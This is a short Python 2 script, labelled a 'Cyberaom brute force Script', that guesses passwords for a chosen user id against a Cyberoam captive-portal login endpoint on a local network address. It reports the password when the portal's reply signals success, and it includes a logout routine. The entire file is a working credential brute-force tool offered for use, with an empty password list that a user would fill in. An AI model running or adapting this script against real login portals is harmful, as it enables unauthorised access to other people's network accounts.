__author__ = 'Xplore'
# Cyberaom brute force Script


import urllib
import time
import datetime
import urllib2
import xml.dom.minidom as XML
userid = raw_input("enter user id:")
test=[]        
print len(test)
def sendLoginRequest(username, password):
    url = 'https://192.168.100.1:8090/httpclient.html'
    post_data = 'mode=191' + '&username=' + username + '&password=' + password
    try:
        req = urllib2.Request(url, post_data)
        response = urllib2.urlopen(req)
        xml_dom = XML.parseString(response.read())
        document = xml_dom.documentElement
        response = document.getElementsByTagName('message')[0].childNodes[0].nodeValue
        print response
        if 'successfully' in response:
            return True
        if 'limit' in response:
            return True
        if 'data' in response:
            return True
            
    except:
        return False    
for l in test:
    print l
    if sendLoginRequest(userid, l) == True:
        #urllib.urlopen("http://google.com")
        print 'success!!! and '+l+' - password, userid -'+userid
        break

lgt = raw_input("do you want to log out -type yes  :")
def sendLogoutRequest(username):
    url = 'https://192.168.100.1:8090/httpclient.html'
    post_data = 'mode=193' + '&username=' + username
    req = urllib2.Request(url, post_data)
    response = urllib2.urlopen(req)
    print response
    print 'logout.'

if lgt == 'yes':
    sendLogoutRequest(userid)




